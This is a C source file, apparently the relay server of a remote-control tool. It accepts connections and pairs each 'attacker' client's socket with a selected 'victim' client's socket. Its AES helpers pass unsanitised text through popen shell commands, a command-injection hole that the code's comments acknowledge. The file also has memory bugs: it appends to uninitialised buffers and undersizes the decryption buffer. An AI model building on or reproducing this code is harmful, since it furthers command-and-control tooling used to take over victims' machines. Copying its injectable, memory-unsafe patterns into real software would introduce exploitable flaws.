#include "connection.h"

int opt = TRUE; 
int i;

void initialize_connection(){
	//initialise all client_list[] to 0 so not checked
	for (i = 0; i < MAX_CLIENTS; i++) {
		clients_list[i].socket_fd = 0;
	}
		
	//create a master socket
	if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0) {
		perror("socket failed");
		exit(EXIT_FAILURE);
	}
		
	//set master socket to allow multiple connections, this is just a good habit, it will work without this
	if( setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ) {
		perror("setsockopt");
		exit(EXIT_FAILURE);
	}
		
	//type of socket created
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons( PORT );
		
	//bind the socket
	if (bind(master_socket, (struct sockaddr *)&address, sizeof(address)) < 0) { 
		perror("bind failed"); 
		exit(EXIT_FAILURE); 
	} 
	printf("Listener on port %d \n", PORT); 
		
	//try to specify maximum of 3 pending connections for the master socket 
	if (listen(master_socket, 3) < 0) { 
		perror("listen"); 
		exit(EXIT_FAILURE); 
	}
	//accept the incoming connection, waiting for connections
	addrlen = sizeof(address);
		
}
void add_child_sockets_to_set(){
	for ( i = 0 ; i < MAX_CLIENTS ; i++) { //make it as a function
		//socket descriptor 
		socket_descriptor = clients_list[i].socket_fd;
			
		//if valid socket descriptor then add to read list 
		if(socket_descriptor > 0)
			FD_SET(socket_descriptor , &readfds); 
			
		//highest file descriptor number, need it for the select function 
		if(socket_descriptor > max_socket_descriptor) 
			max_socket_descriptor = socket_descriptor; 
	}
}

// set the connection between the attacker and his selected victim by setting the socket file descriptor for hech to the other
void set_attacker_victim_connection (client * attacker, char * selected_victim_name){
	char attacker_hashed_id[HASH_LEN];
	strcpy(attacker_hashed_id, md5((unsigned char *) attacker->id, strlen(attacker->id)));
	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS; curr_client_index++){
		fflush(stdout);
		if (strcmp(clients_list[curr_client_index].id, attacker_hashed_id) == 0 && strcmp(clients_list[curr_client_index].name, decrypt_text(selected_victim_name, AES_KEY)) == 0 && clients_list[curr_client_index].i_am == VICTIM){
			// if this client is a victim and this client is the victim of this attacket and if this client is the selected client -> then we will set the files descriptors accordingly
			
			
			clients_list[curr_client_index].other_side_sfd = attacker->socket_fd; // set the socket file descriptor of the attacket to the victim
			attacker->other_side_sfd = clients_list[curr_client_index].socket_fd;
			//clients_list[attacket_index].other_side_sfd = clients_list[curr_client_index].socket_fd;// set the socket file descriptor of the victim to the attacker
		}
	}
}
// AES 256 cbc encryption
char * encrypt_text (char * text_to_encrypt, char * encrypt_key){
	int max_len = (strlen(text_to_encrypt) * 1.36) + 100;
	char * encrypted_text = (char *) malloc(max_len * sizeof(char));
	char sub_buffer[65];
	char encrypt_commend[40 + strlen(text_to_encrypt) + strlen(encrypt_key)];
	sprintf(encrypt_commend, "echo %s | openssl aes-256-cbc -base64 -k %s", text_to_encrypt, encrypt_key); // there is injection variability, to be fix
	FILE * aes_encryption_fd = popen(encrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_encryption_fd) != NULL) {
		strtok(sub_buffer, "\n");
		strcat(encrypted_text, sub_buffer);
	}
	pclose(aes_encryption_fd);
	return encrypted_text;
}

//AES 256 cbc decryption
char * decrypt_text (char * text_to_decrypt, char * decryption_key){
	strtok(text_to_decrypt, "\n");
	char * decrypted_text = (char *) malloc(strlen(text_to_decrypt) * sizeof(char));
	char sub_buffer[65];
	char decrypt_commend[40 + strlen(text_to_decrypt) + strlen(decryption_key)];
	sprintf(decrypt_commend, "echo %s | openssl aes-256-cbc -d -base64 -k %s", text_to_decrypt, decryption_key);// there is injection variability, to be fix

	FILE * aes_decryption_fd = popen(decrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_decryption_fd) != NULL) {
		strtok(sub_buffer, "\n");
		strcat(decrypted_text, sub_buffer);
	}	
	pclose(aes_decryption_fd);
	return decrypted_text;
}

